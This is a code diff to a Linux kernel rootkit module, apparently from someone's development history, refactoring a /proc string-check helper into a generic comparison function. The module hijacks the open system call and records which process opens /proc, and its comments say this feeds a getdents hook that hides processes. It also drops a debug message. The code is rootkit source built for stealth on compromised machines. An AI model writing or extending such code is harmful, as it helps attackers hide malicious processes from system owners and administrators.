@@ -207,17 +207,17 @@ char *get_str_in_kernelspace(const char __user *ustr, char *kstr, int max)
 }
 
 
-/* Is the string ustr "/proc"? */
-int is_proc(const char __user *ustr)
+/* Is the string ustr same as cmp_with? */
+int is_userspace_str(const char __user *ustr, const char *cmp_with)
 {
     int ret = 0;
-    char *kpathname;
+    char *kstr;
 
     mutex_lock(&(buf_struct.lock));
-    kpathname = get_str_in_kernelspace(ustr, buf_struct.buf, PATH_MAX);
-    if (kpathname == NULL)
+    kstr = get_str_in_kernelspace(ustr, buf_struct.buf, PATH_MAX);
+    if (kstr == NULL)
         goto out;
-    if (strcmp("/proc", kpathname) == 0)
+    if (strcmp(kstr, cmp_with) == 0)
         ret = 1;
 out:
     mutex_unlock(&(buf_struct.lock));
@@ -312,11 +312,10 @@ asmlinkage long my_open(const char __user *pathname, int flags, mode_t mode)
     //printk("Hijacked open called\n");
     fd = original_open(pathname, flags, mode);
     
-    if (fd >= 0 && is_proc(pathname)) {
+    if (fd >= 0 && is_userspace_str(pathname, "/proc")) {
         /* opened "/proc";
            store the process's pid and opened fd
            we'll use these in getdents to hide processes */
-        printk("/proc opened\n");
         proc_open_pid = current->pid;
         proc_open_fd = fd;
     }
@@ -391,7 +390,6 @@ void deinit_buf_struct(void)
 
 int rootkit_init(void)
 {
-    pid_t pid;
     printk("Rootkit loaded\n");
     proc_open_fd = -1;
     proc_open_pid = -1;
